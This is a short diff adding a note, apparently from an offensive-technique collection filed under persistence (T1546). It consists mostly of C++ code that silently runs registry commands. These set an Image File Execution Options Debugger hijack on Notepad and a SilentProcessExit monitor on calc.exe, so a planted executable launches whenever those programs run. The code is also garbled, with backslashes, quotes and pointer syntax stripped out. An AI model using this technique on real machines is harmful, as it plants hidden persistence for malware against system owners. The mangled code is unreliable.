@@ -1,0 +1,64 @@
+---
+title: ".012.ImFiExOpIn"
+folder: "05. Persistence/T1546 Event Triggered Execution"
+---
+
+
+
+#include windows.h
+#include fstream
+#include iostream
+void NotepadRGR() {
+
+    const char command = reg add HKEY_LOCAL_MACHINESOFTWAREWOW6432NodeMicrosoftWindows NTCurrentVersionImage File Execution OptionsNotepad.exe v Debugger t REG_SZ d CUsersUserDesktopKimJestem.exe f;
+    STARTUPINFOA si = {};
+    si.cb = sizeof(STARTUPINFOA);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+
+    PROCESS_INFORMATION pi;
+
+
+    if (CreateProcessA(NULL, const_castLPSTR(command), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    }
+}
+void SilentRun() {
+
+    const char command = reg add HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionSilentProcessExitcalc.exe v ReportingMode t REG_SZ d 1 f;
+    const char command3 = reg add HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionSilentProcessExitcalc.exe v MonitorProcess t REG_SZ d CUsersUserDesktopKimJestem.exe f;
+    const char command4 = reg add HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionImage File Execution Optionscalc.exe v GlobalFlag t REG_SZ d 512 f;
+    STARTUPINFOA si = {};
+    si.cb = sizeof(STARTUPINFOA);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+
+    PROCESS_INFORMATION pi;
+
+
+    if (CreateProcessA(NULL, const_castLPSTR(command), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    }
+    if (CreateProcessA(NULL, const_castLPSTR(command3), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    }
+    if (CreateProcessA(NULL, const_castLPSTR(command4), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    }
+}
+
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+
+    NotepadRGR();
+    SilentRun();
+    return 0;
+}
